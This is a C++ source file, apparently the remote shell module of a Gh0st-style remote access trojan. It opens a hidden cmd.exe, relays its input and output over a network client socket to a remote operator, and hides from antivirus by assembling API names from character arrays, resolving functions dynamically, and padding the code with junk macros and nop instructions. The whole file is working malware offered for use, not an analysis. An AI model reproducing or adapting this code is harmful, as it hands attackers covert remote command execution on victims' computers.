// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "ShellManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

typedef BOOL (WINAPI *WriteFileT)
(
    __in        HANDLE hFile,
    __in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    __in        DWORD nNumberOfBytesToWrite,
    __out_opt   LPDWORD lpNumberOfBytesWritten,
    __inout_opt LPOVERLAPPED lpOverlapped
    );

typedef UINT (WINAPI *GetSystemDirectoryAT)
(
    __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
    __in UINT uSize
    );

HMODULE g_Kernel32 = NULL;

CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
{
	char MyKernel32sss[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyGetSystemDirectoryA[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
    GetSystemDirectoryAT pGetSystemDirectoryA = (GetSystemDirectoryAT)GetProcAddress(LoadLibrary(MyKernel32sss),MyGetSystemDirectoryA);
	g_Kernel32 = LoadLibrary("Kernel32.dll");


    SECURITY_ATTRIBUTES  sa = {0};  
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;
	
	typedef BOOL (WINAPI *tCreatePipe)(PHANDLE,PHANDLE,LPSECURITY_ATTRIBUTES,DWORD);
    ANTIVIRUS
	tCreatePipe pCreatePipe =(tCreatePipe)GetProcAddress(g_Kernel32,"CreatePipe");
	
    if(!pCreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
    ANTIVIRUS
		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return;
    }

    if(!pCreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
    ANTIVIRUS
		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return;
    }
SMJJ
	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));

	ANTIVIRUS
	GetStartupInfo(&si);
	ANTIVIRUS

	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 
	
	ANTIVIRUS
	pGetSystemDirectoryA(strShellPath, MAX_PATH);
	ANTIVIRUS
SMJJ
	strcat(strShellPath,"\\cmd.exe");
SMJJ
    ANTIVIRUS
	
	typedef BOOL (WINAPI *tCreateProcess)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,
          BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA ,LPPROCESS_INFORMATION);
	
	tCreateProcess pCreateProcess = (tCreateProcess)GetProcAddress(g_Kernel32,"CreateProcessA");

	if (!pCreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		ANTIVIRUS
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
    ANTIVIRUS
		CloseHandle(m_hReadPipeShell);
    ANTIVIRUS
		CloseHandle(m_hWritePipeShell);
		return;
    }
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	BYTE	bToken = TOKEN_SHELL_START;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}

CShellManager::~CShellManager()
{
	ANTIVIRUS
	typedef BOOL(WINAPI *tTerminateThread)(HANDLE,DWORD);
	__asm nop;
	__asm nop;
__asm nop;
	tTerminateThread pTerminateThread = (tTerminateThread)GetProcAddress(g_Kernel32,"TerminateThread");

	pTerminateThread(m_hThreadRead, 0);
	ANTIVIRUS
	
	typedef BOOL(WINAPI *tTerminateProcess)(HANDLE,DWORD);
	tTerminateProcess pTerminateProcess = (tTerminateProcess)GetProcAddress(g_Kernel32,"TerminateProcess");

	pTerminateProcess(m_hProcessHandle, 0);
	ANTIVIRUS
	pTerminateThread(m_hThreadHandle, 0);
	ANTIVIRUS
	WaitForSingleObject(m_hThreadMonitor, 2000);
	ANTIVIRUS
SMJJ
	pTerminateThread(m_hThreadMonitor, 0);
	
	typedef BOOL(WINAPI *tDisconnectNamedPipe)(HANDLE);
	tDisconnectNamedPipe pDisconnectNamedPipe=(tDisconnectNamedPipe)GetProcAddress(g_Kernel32,"DisconnectNamedPipe");

	if (m_hReadPipeHandle != NULL)
		pDisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
    ANTIVIRUS
		pDisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		pDisconnectNamedPipe(m_hReadPipeShell);
SMJJ
	if (m_hWritePipeShell != NULL)
		pDisconnectNamedPipe(m_hWritePipeShell);

	typedef BOOL(WINAPI *tCloseHandle)(HANDLE);
	tCloseHandle pCloseHandle =(tCloseHandle)GetProcAddress(g_Kernel32,"CloseHandle");

    pCloseHandle(m_hReadPipeHandle);
    pCloseHandle(m_hWritePipeHandle);
    pCloseHandle(m_hReadPipeShell);
    pCloseHandle(m_hWritePipeShell);

    pCloseHandle(m_hProcessHandle);
	pCloseHandle(m_hThreadHandle);
	pCloseHandle(m_hThreadMonitor);
    pCloseHandle(m_hThreadRead);


	FreeLibrary(g_Kernel32);
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	char MyKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyWriteFile[]={'W','r','i','t','e','F','i','l','e','\0'};
	__asm nop;
	__asm nop;
__asm nop;
    WriteFileT pWriteFile = (WriteFileT)GetProcAddress(LoadLibrary(MyKernel32),MyWriteFile);
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	
	unsigned long	ByteWrite;
	ANTIVIRUS
	pWriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
	ANTIVIRUS
}

DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;

	typedef BOOL(WINAPI *tPeekNamedPipe)(HANDLE,LPVOID,DWORD,LPDWORD,LPDWORD,LPDWORD);;
	tPeekNamedPipe pPeekNamedPipe =(tPeekNamedPipe)GetProcAddress(g_Kernel32,"PeekNamedPipe");

	while (1)
	{
		Sleep(100);
		while (pPeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// ·¢ËÍÊý¾Ý
			pThis->Send(lpBuffer, BytesRead);
SMJJ
			LocalFree(lpBuffer);
		}
	}
	return 0;
}

DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	ANTIVIRUS
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
	ANTIVIRUS

	typedef BOOL(WINAPI *tTerminateThread)(HANDLE,DWORD);
	tTerminateThread pTerminateThread = (tTerminateThread)GetProcAddress(g_Kernel32,"TerminateThread");
	
		
	typedef BOOL(WINAPI *tTerminateProcess)(HANDLE,DWORD);
    ANTIVIRUS
	tTerminateProcess pTerminateProcess = (tTerminateProcess)GetProcAddress(g_Kernel32,"TerminateProcess");

	pTerminateThread(pThis->m_hThreadRead, 0);
	pTerminateProcess(pThis->m_hProcessHandle, 1);
	
	pThis->m_pClient->Disconnect();
SMJJ
	return 0;
}
